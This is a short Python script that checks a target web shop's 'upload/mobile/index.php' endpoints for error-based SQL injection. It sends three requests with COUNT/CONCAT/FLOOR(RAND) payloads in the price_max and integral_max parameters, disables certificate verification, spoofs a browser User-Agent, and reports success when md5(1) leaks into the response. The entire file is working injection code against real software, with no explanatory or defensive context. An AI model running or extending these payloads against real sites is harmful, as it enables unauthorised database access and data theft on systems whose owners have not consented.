import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response.text:
		r0=True
	else:
		r0=False
	url=baseurl+"upload/mobile/index.php?c=category&a=async_list&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'"
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response.text:
		r1=True
	else:
		r1=False
	url=baseurl+"upload/mobile/index.php?c=Exchange&a=asynclist_list&integral_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'"
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in response.text:
		r2=True
	else:
		r2=False
	if r0 or r1 or r2:
		return True
	else:
		return False
